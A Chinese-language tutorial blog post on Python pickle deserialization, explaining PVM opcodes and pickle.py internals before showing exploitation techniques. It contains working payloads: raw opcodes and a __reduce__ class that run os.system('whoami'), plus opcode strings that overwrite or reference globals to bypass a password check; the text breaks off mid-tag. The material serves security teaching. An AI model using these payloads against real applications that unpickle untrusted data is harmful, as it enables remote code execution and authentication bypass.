    <content type="html"><![CDATA[<h1 id="python的序列化和反序列化"><a href="#python的序列化和反序列化" class="headerlink" title="python的序列化和反序列化"></a>python的序列化和反序列化</h1><p>与PHP，Java类似，python的序列化和反序列化就是对象与数据的相互转换，是为了解决对象传输与持久化存储问题</p><p>在Python中序列化一般通过pickle模块和json模块实现</p><p>pickle模块和json模块提供了dumps()、dump()、loads()、load()四个函数</p><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>dump()</td><td>对象反序列化到文件对象并存入文件</td></tr><tr><td>dumps()</td><td>对象反序列化为 bytes 对象</td></tr><tr><td>load()</td><td>对象反序列化并从文件中读取数据</td></tr><tr><td>loads()</td><td>从 bytes 对象反序列化</td></tr></tbody></table><p>与json相比，pickle以二进制储存，不易人工阅读；json可以跨语言，而pickle是Python专用的；pickle能表示python几乎所有的类型（包括自定义类型），json只能表示一部分内置类型且不能表示自定义类型</p><h1 id="PVM"><a href="#PVM" class="headerlink" title="PVM"></a>PVM</h1><blockquote><p>python序列化和反序列化的过程都是发生在PVM(Pickle Virtual Machine)上的，它是Python标准库中的一部分，由Python的pickle模块提供支持</p></blockquote><p>pvm由指令处理器、栈区和内存区三部分组成</p><ul><li><p>指令处理器：也就是引擎，从流中读取opcode和参数, 并对其进行解释处理. 重复这个动作, 直到遇到.这个结束符后停止, 最终留在栈顶的值将被作为反序列化对象返回</p></li><li><p>栈区：由Python的list实现, 被用来临时存储数据、参数以及对象, 在不断的进出栈过程中完成对数据流的反序列化操作, 并最终在栈顶生成反序列化的结果</p></li><li><p>内存区：或者称为标签区，由Python的dict实现, 为PVM的整个生命周期提供存储（将反序列化完成的数据以 key-value 的形式储存在memo中，以便后来使用）</p></li></ul><h2 id="PVM-协议"><a href="#PVM-协议" class="headerlink" title="PVM 协议"></a>PVM 协议</h2><p>因为python版本的不同，所以默认使用的协议不同。因为PVM的指令集用的协议有很大的差别，所以不同的python版本序列化出来的数据是有差别的</p><p>可以通过<code>protocol=num</code>来选择opcode的版本，pickle协议是向前兼容的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name=<span class="hljs-string">&#x27;lewiserii&#x27;</span></span>):<br>        self.name = name<br><br><br>test = Test()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] pickle v&#123;&#125;: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">str</span>(i), pickle.dumps(test, protocol=i)))<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">[+] pickle v0: <span class="hljs-string">b&#x27;ccopy_reg\n_reconstructor\np0\n(c__main__\nTest\np1\nc__builtin__\nobject\np2\nNtp3\nRp4\n(dp5\nVname\np6\nVlewiserii\np7\nsb.&#x27;</span><br>[+] pickle v1: <span class="hljs-string">b&#x27;ccopy_reg\n_reconstructor\nq\x00(c__main__\nTest\nq\x01c__builtin__\nobject\nq\x02Ntq\x03Rq\x04&#125;q\x05X\x04\x00\x00\x00nameq\x06X\t\x00\x00\x00lewiseriiq\x07sb.&#x27;</span><br>[+] pickle v2: <span class="hljs-string">b&#x27;\x80\x02c__main__\nTest\nq\x00)\x81q\x01&#125;q\x02X\x04\x00\x00\x00nameq\x03X\t\x00\x00\x00lewiseriiq\x04sb.&#x27;</span><br>[+] pickle v3: <span class="hljs-string">b&#x27;\x80\x03c__main__\nTest\nq\x00)\x81q\x01&#125;q\x02X\x04\x00\x00\x00nameq\x03X\t\x00\x00\x00lewiseriiq\x04sb.&#x27;</span><br>[+] pickle v4: <span class="hljs-string">b&#x27;\x80\x04\x95/\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x04Test\x94\x93\x94)\x81\x94&#125;\x94\x8c\x04name\x94\x8c\tlewiserii\x94sb.&#x27;</span><br>[+] pickle v5: <span class="hljs-string">b&#x27;\x80\x05\x95/\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x04Test\x94\x93\x94)\x81\x94&#125;\x94\x8c\x04name\x94\x8c\tlewiserii\x94sb.&#x27;</span><br></code></pre></td></tr></table></figure><p>不同版本间的区别</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs text">v0 版协议是原始的&quot;人类可读&quot;协议，并且向后兼容早期版本的 Python<br>v1 版协议是较早的二进制格式，它也与早期版本的 Python 兼容<br>v2 版协议是在 Python 2.3 中加入的，它为存储 new-style class 提供了更高效的机制（参考 PEP 307）<br>v3 版协议是在 Python 3.0 中加入的，它显式地支持 bytes 字节对象，不能使用 Python 2.x 解封。这是 Python 3.0-3.7 的默认协议<br>v4 版协议添加于 Python 3.4。它支持存储非常大的对象，能存储更多种类的对象，还包括一些针对数据格式的优化（参考 PEP 3154）。它是 Python 3.8 使用的默认协议<br>v5 版协议是在 Python 3.8 中加入的。它增加了对带外数据的支持，并可加速带内数据处理（参考 PEP 574）<br></code></pre></td></tr></table></figure><h2 id="opcode"><a href="#opcode" class="headerlink" title="opcode"></a>opcode</h2><p>opcode也就是操作码，是序列化内容的核心，并且 opcode 是单字节的</p><p>在<code>$PYTHON/Lib/pickle.py</code>中可以查看到完整的opcode</p><p>以下是V0协议中一些常见的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python">MARK           = <span class="hljs-string">b&#x27;(&#x27;</span>   <span class="hljs-comment"># 向栈中压入一个 MARK 标记</span><br>STOP           = <span class="hljs-string">b&#x27;.&#x27;</span>   <span class="hljs-comment"># 程序结束，栈顶的一个元素作为 pickle.loads() 的返回值</span><br>POP            = <span class="hljs-string">b&#x27;0&#x27;</span>   <span class="hljs-comment"># 丢弃栈顶对象</span><br>POP_MARK       = <span class="hljs-string">b&#x27;1&#x27;</span>   <span class="hljs-comment"># 丢弃栈顶到最顶层的标记对象</span><br>DUP            = <span class="hljs-string">b&#x27;2&#x27;</span>   <span class="hljs-comment"># 重复的顶部堆栈项目</span><br>FLOAT          = <span class="hljs-string">b&#x27;F&#x27;</span>   <span class="hljs-comment"># 实例化一个 float 对象</span><br>INT            = <span class="hljs-string">b&#x27;I&#x27;</span>   <span class="hljs-comment"># 实例化一个 int 或者 bool 对象</span><br>NONE           = <span class="hljs-string">b&#x27;N&#x27;</span>   <span class="hljs-comment"># 栈中压入 None</span><br>REDUCE         = <span class="hljs-string">b&#x27;R&#x27;</span>   <span class="hljs-comment"># 从栈上弹出两个对象，第一个对象作为参数（必须为元组），第二个对象作为函数，然后调用该函数并把结果压回栈</span><br>STRING         = <span class="hljs-string">b&#x27;S&#x27;</span>   <span class="hljs-comment"># 实例化一个字符串对象</span><br>UNICODE        = <span class="hljs-string">b&#x27;V&#x27;</span>   <span class="hljs-comment"># 实例化一个 UNICODE 字符串对象</span><br>APPEND         = <span class="hljs-string">b&#x27;a&#x27;</span>   <span class="hljs-comment"># 将栈的第一个元素 append 到第二个元素（必须为列表）中</span><br>BUILD          = <span class="hljs-string">b&#x27;b&#x27;</span>   <span class="hljs-comment"># 使用栈中的第一个元素（储存多个 属性名-属性值 的字典）对第二个元素（对象实例）进行属性设置，调用 __setstate__ 或 __dict__.update()</span><br>GLOBAL         = <span class="hljs-string">b&#x27;c&#x27;</span>   <span class="hljs-comment"># 获取一个全局对象或 import 一个模块（会调用 import 语句，能够引入新的包），压入栈</span><br>DICT           = <span class="hljs-string">b&#x27;d&#x27;</span>   <span class="hljs-comment"># 寻找栈中的上一个 MARK，并组合之间的数据为字典（数据必须有偶数个，即呈 key-value 对），弹出组合，弹出 MARK，压回结果</span><br>EMPTY_DICT     = <span class="hljs-string">b&#x27;&#125;&#x27;</span>   <span class="hljs-comment"># 向栈中直接压入一个空字典</span><br>APPENDS        = <span class="hljs-string">b&#x27;e&#x27;</span>   <span class="hljs-comment"># 寻找栈中的上一个 MARK，组合之间的数据并 extends 到该 MARK 之前的一个元素（必须为列表）中</span><br>GET            = <span class="hljs-string">b&#x27;g&#x27;</span>   <span class="hljs-comment"># 将 memo[n] 的压入栈</span><br>INST           = <span class="hljs-string">b&#x27;i&#x27;</span>   <span class="hljs-comment"># 相当于 c 和 o 的组合，先获取一个全局函数，然后从栈顶开始寻找栈中的上一个 MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</span><br>LIST           = <span class="hljs-string">b&#x27;l&#x27;</span>   <span class="hljs-comment"># 从栈顶开始寻找栈中的上一个 MARK，并组合之间的数据为列表</span><br>EMPTY_LIST     = <span class="hljs-string">b&#x27;]&#x27;</span>   <span class="hljs-comment"># 向栈中直接压入一个空列表</span><br>OBJ            = <span class="hljs-string">b&#x27;o&#x27;</span>   <span class="hljs-comment"># 从栈顶开始寻找栈中的上一个 MARK，以之间的第一个数据（必须为函数）为 callable，第二个到第 n 个数据为参数，执行该函数（或实例化一个对象），弹出 MARK，压回结果，</span><br>PUT            = <span class="hljs-string">b&#x27;p&#x27;</span>   <span class="hljs-comment"># 将栈顶对象储存至 memo[n]</span><br>SETITEM        = <span class="hljs-string">b&#x27;s&#x27;</span>   <span class="hljs-comment"># 将栈的第一个对象作为 value，第二个对象作为 key，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为 key）中</span><br>TUPLE          = <span class="hljs-string">b&#x27;t&#x27;</span>   <span class="hljs-comment"># 寻找栈中的上一个 MARK，并组合之间的数据为元组，弹出组合，弹出 MARK，压回结果</span><br>EMPTY_TUPLE    = <span class="hljs-string">b&#x27;)&#x27;</span>   <span class="hljs-comment"># 向栈中直接压入一个空元组</span><br>SETITEMS       = <span class="hljs-string">b&#x27;u&#x27;</span>   <span class="hljs-comment"># 寻找栈中的上一个 MARK，组合之间的数据（数据必须有偶数个，即呈 key-value 对）并全部添加或更新到该 MARK 之前的一个元素（必须为字典）中</span><br></code></pre></td></tr></table></figure><h2 id="处理序列化字节流的过程"><a href="#处理序列化字节流的过程" class="headerlink" title="处理序列化字节流的过程 "></a>处理序列化字节流的过程 <a id="a"></h2><p>这里用一段简短的字节码来演示利用过程:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">cos<br>system<br>(S<span class="hljs-string">&#x27;whoami&#x27;</span><br>tR.<br></code></pre></td></tr></table></figure><p>按照pickle.py中的源码分析处理序列化字节流的过程</p><p><strong>c</strong></p><p>获取一个全局对象或 import 一个模块（会调用 import 语句，能够引入新的包），压入栈</p><p>源代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_global</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-comment"># 读取一行数据，去掉换行符，作为模块名，例子中是os</span><br>    module = self.readline()[:-<span class="hljs-number">1</span>].decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    <span class="hljs-comment"># 读取下一行数据，作为类名，例子中是system</span><br>    name = self.readline()[:-<span class="hljs-number">1</span>].decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    <span class="hljs-comment"># 调用find_class</span><br>    klass = self.find_class(module, name)<br>    <span class="hljs-comment"># 获取模块后添加到当前栈中</span><br>    self.append(klass)<br>dispatch[GLOBAL[<span class="hljs-number">0</span>]] = load_global<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_class</span>(<span class="hljs-params">self, module, name</span>):<br>    <span class="hljs-comment"># Subclasses may override this.</span><br>    <span class="hljs-comment"># 在系统审计功能记录pickle.find_class事件，附带参数module和name</span><br>    sys.audit(<span class="hljs-string">&#x27;pickle.find_class&#x27;</span>, module, name)<br><br>    <span class="hljs-comment"># 如果协议版本小于3且开启了fix_imports标志，则进行特殊的名称和模块映射处理</span><br>    <span class="hljs-keyword">if</span> self.proto &lt; <span class="hljs-number">3</span> <span class="hljs-keyword">and</span> self.fix_imports:<br>        <span class="hljs-comment"># 如果(module, name)在NAME_MAPPING中，则使用映射的名称代替原名称</span><br>        <span class="hljs-keyword">if</span> (module, name) <span class="hljs-keyword">in</span> _compat_pickle.NAME_MAPPING:<br>            module, name = _compat_pickle.NAME_MAPPING[(module, name)]<br>        <span class="hljs-comment"># 如果module在IMPORT_MAPPING中，则使用映射的模块名代替原模块名</span><br>        <span class="hljs-keyword">elif</span> module <span class="hljs-keyword">in</span> _compat_pickle.IMPORT_MAPPING:<br>            module = _compat_pickle.IMPORT_MAPPING[module]<br><br>    <span class="hljs-comment"># 动态加载指定模块</span><br>    <span class="hljs-built_in">__import__</span>(module, level=<span class="hljs-number">0</span>)<br>    <span class="hljs-comment"># 如果协议版本大于4则使用_getattribute方法获取对象</span><br>    <span class="hljs-keyword">if</span> self.proto &gt;= <span class="hljs-number">4</span>:<br>        <span class="hljs-keyword">return</span> _getattribute(sys.modules[module], name)[<span class="hljs-number">0</span>]<br>    <span class="hljs-comment"># 否则使用getattr方法获取对象</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(sys.modules[module], name)<br><br><span class="hljs-comment"># 与getattr类似</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_getattribute</span>(<span class="hljs-params">obj, name</span>):<br>    <span class="hljs-comment"># 将属性名按照点号（.）进行分割</span><br>    <span class="hljs-keyword">for</span> subpath <span class="hljs-keyword">in</span> name.split(<span class="hljs-string">&#x27;.&#x27;</span>):<br>        <span class="hljs-keyword">if</span> subpath == <span class="hljs-string">&#x27;&lt;locals&gt;&#x27;</span>:<br>            <span class="hljs-keyword">raise</span> AttributeError(<span class="hljs-string">&quot;Can&#x27;t get local attribute &#123;!r&#125; on &#123;!r&#125;&quot;</span><br>                                 .<span class="hljs-built_in">format</span>(name, obj))<br>        <span class="hljs-keyword">try</span>:<br>            parent = obj<br>            obj = <span class="hljs-built_in">getattr</span>(obj, subpath)<br>        <span class="hljs-keyword">except</span> AttributeError:<br>            <span class="hljs-keyword">raise</span> AttributeError(<span class="hljs-string">&quot;Can&#x27;t get attribute &#123;!r&#125; on &#123;!r&#125;&quot;</span><br>                                 .<span class="hljs-built_in">format</span>(name, obj)) <span class="hljs-keyword">from</span> <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">return</span> obj, parent<br></code></pre></td></tr></table></figure><p><strong>(</strong></p><p>向栈中压入一个 MARK 标记</p><p>源代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_mark</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-comment"># 将当前stack列表添加到metastack中，相当于标记</span><br>    self.metastack.append(self.stack)<br>    <span class="hljs-comment"># 清空当前栈</span><br>    self.stack = []<br>    <span class="hljs-comment"># 设置一个简化的append方法</span><br>    self.append = self.stack.append<br>dispatch[MARK[<span class="hljs-number">0</span>]] = load_mark<br></code></pre></td></tr></table></figure><p><strong>S</strong></p><p>实例化一个字符串对象</p><p>源代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_string</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-comment"># 读取一行数据，去除换行符</span><br>    data = self.readline()[:-<span class="hljs-number">1</span>]<br>    <span class="hljs-comment"># 去掉最外面的引号</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) &gt;= <span class="hljs-number">2</span> <span class="hljs-keyword">and</span> data[<span class="hljs-number">0</span>] == data[-<span class="hljs-number">1</span>] <span class="hljs-keyword">and</span> data[<span class="hljs-number">0</span>] <span class="hljs-keyword">in</span> <span class="hljs-string">b&#x27;&quot;\&#x27;&#x27;</span>:<br>        data = data[<span class="hljs-number">1</span>:-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> UnpicklingError(<span class="hljs-string">&quot;the STRING opcode argument must be quoted&quot;</span>)<br>    <span class="hljs-comment"># 对数据解码后添加到当前栈中</span><br>    self.append(self._decode_string(codecs.escape_decode(data)[<span class="hljs-number">0</span>]))<br>dispatch[STRING[<span class="hljs-number">0</span>]] = load_string<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_decode_string</span>(<span class="hljs-params">self, value</span>):<br>    <span class="hljs-comment"># Used to allow strings from Python 2 to be decoded either as</span><br>    <span class="hljs-comment"># bytes or Unicode strings.  This should be used only with the</span><br>    <span class="hljs-comment"># STRING, BINSTRING and SHORT_BINSTRING opcodes.</span><br>    <span class="hljs-keyword">if</span> self.encoding == <span class="hljs-string">&quot;bytes&quot;</span>:<br>        <span class="hljs-keyword">return</span> value<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> value.decode(self.encoding, self.errors)<br></code></pre></td></tr></table></figure><p><strong>t</strong></p><p>寻找栈中的上一个 MARK，并组合之间的数据为元组，弹出组合，弹出 MARK，压回结果</p><p>源代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_tuple</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-comment"># 弹出当前栈中数据</span><br>    items = self.pop_mark()<br>    <span class="hljs-comment"># 转成tuple类型并添加到还原后的栈中</span><br>    self.append(<span class="hljs-built_in">tuple</span>(items))<br>dispatch[TUPLE[<span class="hljs-number">0</span>]] = load_tuple<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pop_mark</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-comment"># 返回当前的stack到items</span><br>    items = self.stack<br>    <span class="hljs-comment"># 从metastack还原之前的stack</span><br>    self.stack = self.metastack.pop()<br>    self.append = self.stack.append<br>    <span class="hljs-keyword">return</span> items<br></code></pre></td></tr></table></figure><p><strong>R</strong></p><p>从栈上弹出两个对象，第一个对象作为参数（必须为元组），第二个对象作为函数，然后调用该函数并把结果压回栈</p><p>源代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_reduce</span>(<span class="hljs-params">self</span>):<br>    stack = self.stack<br>    <span class="hljs-comment"># 第一个对象作为参数</span><br>    args = stack.pop()<br>    <span class="hljs-comment"># 第二个对象作为函数</span><br>    func = stack[-<span class="hljs-number">1</span>]<br>    <span class="hljs-comment"># 调用func函数，并把结果赋给栈顶</span><br>    stack[-<span class="hljs-number">1</span>] = func(*args)<br>dispatch[REDUCE[<span class="hljs-number">0</span>]] = load_reduce<br></code></pre></td></tr></table></figure><p><strong>.</strong></p><p>程序结束，栈顶的一个元素作为 pickle.loads() 的返回值</p><p>源代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 结束反序列化</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_stop</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-comment"># 栈顶的值作为返回值</span><br>    value = self.stack.pop()<br>    <span class="hljs-keyword">raise</span> _Stop(value)<br>dispatch[STOP[<span class="hljs-number">0</span>]] = load_stop<br></code></pre></td></tr></table></figure><p>所以可以得到以下解释</p><p>c后面跟的是模块名，换行之后的是类名，相当于将os.system放入栈中，然后放入一个标记符，接着将字符串 whoami 放入栈中，遇到t将栈中的数据弹出，一直到标记，并转为 tuple 再存入栈中，同时标记符消失，遇到R后将元组取出，作为参数放入函数中执行后将结果返回</p><p>可以看作执行了<code>os.system(&#39;whoami&#39;)</code></p><p><img src="/img/summary/python_unserialize-1.png"></p><h2 id="pickletools"><a href="#pickletools" class="headerlink" title="pickletools"></a>pickletools</h2><p>当字节码很多的时候一个一个对着表去读会很麻烦，所以Python提供了pickletools工具，便于人工解读opcode</p><p>pickletools常用的有<code>pickletools.dis</code>和<code>pickletools.optimize</code></p><p><code>pickletools.dis</code>：具有反汇编的功能，可以以可读性较强的方式展示一个序列化对象</p><p><img src="/img/summary/python_unserialize-2.png"></p><p><code>pickletools.optimize</code>：对一个序列化结果进行优化（消除未使用的 <code>PUT</code> 操作码）</p><p><img src="/img/summary/python_unserialize-3.png"></p><h1 id="常见利用思路"><a href="#常见利用思路" class="headerlink" title="常见利用思路"></a>常见利用思路</h1><p>漏洞产生原因是用户可控的反序列化入口点</p><h2 id="魔术方法-reduce"><a href="#魔术方法-reduce" class="headerlink" title="魔术方法 __reduce__()"></a>魔术方法 __reduce__()</h2><blockquote><p>PVM 的 操作码 R 就是 __reduce__() 的返回值的一个底层实现<br>与php中的__wakeup()方法类似，python在反序列化时会先调用__reduce__()魔术方法，所以我们可以利用这一特点触发恶意代码</p></blockquote><p>一个利用<code>__reduce__()</code>的例子，在能够传入可控的 pickle.loads 的 data 时就可以生效</p><p>但是需要注意reduce一次只能执行一个函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-comment"># 注意python2与python3 之间的新式类与旧式类的区别，python2需要手动继承object</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        shell = <span class="hljs-string">&quot;&quot;&quot;whoami&quot;&quot;&quot;</span>          <span class="hljs-comment"># 要执行的命令</span><br>        <span class="hljs-keyword">return</span> os.system, (shell,)    <span class="hljs-comment"># reduce函数必须返回元组或字符串</span><br><br><br>test = Test()<br>a = pickle.dumps(test, protocol=<span class="hljs-number">0</span>)<br>pickle.loads(a)<br><span class="hljs-built_in">print</span>(a)<br>pickletools.dis(pickletools.optimize(a))<br></code></pre></td></tr></table></figure><p><img src="/img/summary/python_unserialize-4.png"></p><p><img src="/img/summary/python_unserialize-5.png"></p><h2 id="全局变量覆盖"><a href="#全局变量覆盖" class="headerlink" title="全局变量覆盖"></a>全局变量覆盖</h2><blockquote><p>可以通过覆盖一些凭证达到绕过身份验证的目的</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><br><span class="hljs-keyword">import</span> secret<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;变量的值为:&quot;</span> + secret.key)<br><br>opcode = <span class="hljs-string">b&#x27;&#x27;&#x27;c__main__</span><br><span class="hljs-string">secret</span><br><span class="hljs-string">(S&#x27;key&#x27;</span><br><span class="hljs-string">S&#x27;123&#x27;</span><br><span class="hljs-string">db.&#x27;&#x27;&#x27;</span><br><br>pickle.loads(opcode)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;变量的值为:&quot;</span> + secret.key)<br>pickletools.dis(opcode)<br></code></pre></td></tr></table></figure><p><img src="/img/summary/python_unserialize-6.png"></p><h2 id="全局变量引用"><a href="#全局变量引用" class="headerlink" title="全局变量引用"></a>全局变量引用</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><span class="hljs-keyword">import</span> secret<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Target</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        obj = pickle.loads(<span class="hljs-string">b&#x27;ccopy_reg\n_reconstructor\n(c__main__\nTarget\nc__builtin__\nobject\nNtR(dVpwd\nVa\nsb.&#x27;</span>)<br>        <span class="hljs-keyword">if</span> obj.pwd == secret.pwd:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Hello, admin!&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No&quot;</span>)<br><br><br>test = Target()<br></code></pre></td></tr></table></figure><p>上面的例子中我们并不知道<code>secret.pwd</code>的值，要使if成立，可以使用<code>c</code>来实现</p><p><code>c</code>的作用是 获取一个全局对象或 import 一个模块（会调用 import 语句，能够引入新的包），压入栈</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">b&#x27;ccopy_reg\n_reconstructor\n(c__main__\nTarget\nc__builtin__\nobject\nNtR(dVpwd\nVaaa\nsb.&#x27;</span><br><br><span 